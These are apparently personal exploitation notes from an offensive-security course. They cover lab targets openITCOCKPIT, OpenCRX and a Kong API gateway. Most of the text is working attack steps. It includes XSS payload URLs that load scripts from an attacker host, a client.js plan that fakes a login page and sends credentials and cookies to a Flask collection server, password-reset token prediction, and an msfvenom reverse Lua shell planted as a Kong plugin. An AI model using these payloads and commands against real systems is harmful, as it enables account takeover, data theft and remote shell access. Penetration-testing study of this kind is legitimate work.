## Miscellaneous Exploits:

    JavaScript - Library Enumeration & XSS (Blackbox) -> CSRF Content Scraping (openITCOCKPIT):
        Brute-forcing JavaScript libraries:
            wget https://github.com/nice-registry/all-the-package-names/raw/master/names.json
            jq '.[0:10000]' names.json | grep ","| cut -d'"' -f 2 > npm-10000.txt
            gobuster dir -w ./npm-10000.txt -u https://openitcockpit/js/vendor/ -k
            Then their sub-files/versions:
                Put library urls into packages.txt:  https://openitcockpit/js/vendor/fineuploader, etc.
                while read l; do echo "===$l==="; gobuster dir -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -k -q -u $l; done < packages.txt
                Look for versions:  while read l; do echo "===$l==="; curl $l/README.md -k; done < packages.txt
        Finding XSS: Download the libraries/versions from github, then search their .html files for DOM-based XSS vulns (ex. url params):
            find ./ -iname "*.html"
            grep -r "document.write" ./ --include *.html    //Looking for user-controlled input to page
                grep -r "buildPath[[:space:]]*=" ./         //Finding where a variable is set
            POC:  ex.  https://192.168.169.129/js/vendor/lodash/perf/index.html?build="></script>;<script>alert(1)</script>
                Remote Script:  https://192.168.169.129/js/vendor/lodash/perf/index.html?build="></script>;<script src="http://192.168.119.169/alert.js"></script>
                    Content:  alert(1)
                Remote iFrame:  https://192.168.169.129/js/vendor/lodash/perf/index.html?build="></script>;<iframe src="https://192.168.119.169/alert.html" width="600" height="600"></iframe>
                    Content:  <script>alert(1)</script>
                Host Local HTTPS Script (to avoid mixed content types):
                    openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes
                    https://stackoverflow.com/questions/19705785/python-3-simple-https-server
                    Or keep HTTP:  In FireFox set security.mixed_content.block_active_content to false
            Cookies:
                Check if HTTPOnly is set:  console>Storage>Cookies  -> if it is, can't steal via XSS
            Site Enumeration via XSS - Custom Exploitation Application:
                3 main components: XSS payload script, SQLite database to store collected content, & Flask API server to receive content 
                POC: Querying content (test in console) and Faking Login Page:
                    Run on login page:
                        loginhtml = document.getElementsByTagName("html")[0].innerHTML;
                        localStorage.setItem("loginhtml", loginhtml);
                    Run on XSS vulnerable page:
                        lpage = localStorage.getItem("loginhtml");
                        document.getElementsByTagName("html")[0].innerHTML = lpage;
                    Bonus: Disabling login submit button (keep user on page):  <form onsubmit="myFunction(); return false;">
                    Bonus: Keep user longer w/ iframe trap:  https://www.trustedsec.com/blog/persisting-xss-with-iframe-traps/
            Create Database to Store Exfiltrated Data:
                Manually:  python3 db.py â€“-create
                Example Usage (by API):
                    Insert Page:  python3 db.py -i -L 'http://target/abc' -C '<h1>abc</h1>'
                    Insert Cookie:  python3 db.py -i -V1 'auth:98234238'
                    Insert Creds:  python3 db.py -i -V2 'username:abcabc'
                    View All Cookies:  python3 db.py -g2
                    View All Creds:  python3 db.py -g3
                    View Page URLs:  python3 db.py -l
                    View a Page's Content:  python3 db.py -g -L 'http://target/abc'
            Create Flask Server to Collect Exfiltrated Data:
                sudo pip3 install flask_cors
                Generate Certificate (for HTTPS):  openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365
                sudo python3 api.py
            Exploit:  https://192.168.169.129/js/vendor/lodash/perf/index.html?build="></script>;<script src="https://192.168.119.169/client.js"></script>
            Dump results:  python3 dump.py
            Payload Steps (client.js):
                1. Replaces vulnerable page DOM with fake login page.
                    Bonus: modifies form onsubmit action to send creds to our API server.
                2. Loads the home page.
                    Via iframe, not XHR - this accounts for redirects and JS scripts that load additional links.
                Bonus: Scrapes Auto-Fill Creds and Cookies for the site and sends back to our API server
                3. Searches for all unique links ("a" elements) and save their hrefs.
                4. Fetches the content of each link.
                5. Sends the content obtained from each link to our API server.       
            Parse Output URLs:  python3 dump.py

    Java - java.util.Random Exploitation:
        Use debugging! Target server might have time offset.
        ex. Password Reset Token Brute-Forcing (OpenCRX):
            If we can predict when a token is requested, we should be able to generate a matching token by manipulating the seed value when creating our own Random object
            Getting range of potential seed values:
                date +%s%3N && curl -s -i -X 'POST' --data-binary 'id=guest' 'http://opencrx:8080/opencrx-core-CRX/RequestPasswordReset.jsp' && date +%s%3N
                    confirm range by converting http header date to epoch time; *run date +%s%3N on both boxes and get offset
            Create our own token generator .java file
                Compile: javac OpenCRXToken.java ; and Run: java OpenCRXToken <t1> <t2> > tokens.txt  (recompile after each change)
                Spray and reset password:  python2 OpenCRXReset.py -u guest -p password  OR  python2 fullExploit.py -u guest -p password            
        ex. 2:
            date +%s%3N > time1.txt && curl -s -i -X 'POST' --data-binary 'username=Carl' 'http://192.168.162.251/generateMagicLink' > /dev/null && date +%s%3N > time2.txt
            javac tokenGenerator.java
            java tokenGenerator %s %s %s > tokens.txt 2> /dev/null
            python2 tokenExploit.py -u Carl -ID 5

    API Plugin RCE (APIGateway):
        Look at default plugins already included (check documentation)
        Serverless Functions plugin - allows RCE through pre-function and post-function sub-plugins
            Check if enabled:  from initial api call - yes
        Pre-Function Plugin runs Lua - create payload:
            msfvenom -p cmd/unix/reverse_lua lhost=192.168.119.169 lport=4444 -f raw -o shell.lua
        For Kong: create a Service, add a Route to the Service, then add Lua shell code as a "pre-function" plugin to the Service
            *Host JavaScript payload that does all that - rce.html
            Upload it:
                curl -X POST -H "Content-Type: application/json" -d '{"url":"http://172.16.16.2:9000/api/render?url=http://192.168.119.169/rce.html"}' http://192.168.169.135:8000/files/import
                    Or:  curl -i -X POST -H "apikey: SBzrCb94o9JOWALBvDAZLnHo3s90smjC" -H "Content-Type: application/json" -d '{"url":"http://192.168.119.169/rce.html"}' http://192.168.169.135:8000/render
            Trigger!:  curl -i http://192.168.169.135:8000/supersecret

    WebSockets - initiated via Javascript - initialization must be located in one of the JS files on the page